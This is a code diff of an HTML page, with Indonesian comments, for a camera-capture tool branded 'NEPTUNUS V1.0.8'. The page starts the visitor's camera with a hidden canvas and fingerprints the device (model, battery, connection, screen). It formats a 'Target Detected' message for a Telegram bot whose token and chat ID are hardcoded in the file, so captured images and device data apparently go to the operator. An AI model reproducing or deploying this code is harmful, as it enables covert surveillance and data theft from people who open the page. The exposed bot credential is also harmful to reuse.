@@ -18,7 +18,6 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // MASUKKAN TOKEN DAN CHAT ID DI SINI
         const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
         const CHAT_ID = '6888530451';
         
@@ -27,14 +26,21 @@
 
         function getDeviceName() {
             const ua = navigator.userAgent;
-            if (/iPhone|iPad|iPod/.test(ua)) return "Apple iOS Device";
-            if (/Samsung|SM-/.test(ua)) return "Samsung Galaxy";
-            if (/Redmi|Xiaomi|Mi|POCO/.test(ua)) return "Xiaomi / Redmi";
-            if (/Oppo/.test(ua)) return "Oppo Device";
-            if (/Vivo/.test(ua)) return "Vivo Device";
-            if (/Realme/.test(ua)) return "Realme Device";
-            if (/Pixel/.test(ua)) return "Google Pixel";
-            return "Android Device";
+            // Mencoba menangkap bagian model di dalam user agent
+            // Format umum: (Linux; Android 13; Model_HP Build/...)
+            const match = ua.match(/\(([^)]+)\)/);
+            if (match && match[1]) {
+                const parts = match[1].split(';');
+                // Bagian model biasanya terletak di posisi ke-2 atau ke-3 setelah Android
+                for (let part of parts) {
+                    part = part.trim();
+                    if (part.toLowerCase().includes('build')) continue;
+                    if (part.toLowerCase().includes('android')) continue;
+                    if (part.toLowerCase().includes('linux')) continue;
+                    if (part.length > 2) return part;
+                }
+            }
+            return "Android Mobile";
         }
 
         async function startCamera() {
@@ -68,11 +74,11 @@
             } catch (e) {}
 
             const info = `📸 <b>Target Terdeteksi!</b>\n\n` +
-                         `📱 <b>Perangkat:</b> ${getDeviceName()}\n` +
+                         `📱 <b>Perangkat:</b> <code>${getDeviceName()}</code>\n` +
                          `🔋 <b>Baterai:</b> ${battery}\n` +
                          `🌐 <b>Koneksi:</b> ${navigator.connection ? navigator.connection.effectiveType.toUpperCase() : 'N/A'}\n` +
                          `🖥 <b>Resolusi:</b> ${window.screen.width}x${window.screen.height}\n` +
-                         `🌍 <b>Sistem:</b> Android / Mobile OS\n\n` +
+                         `🌍 <b>Sistem:</b> Android\n\n` +
                          `<i>NEPTUNUS V1.0.8</i>`;
 
             canvas.width = video.videoWidth || 640;
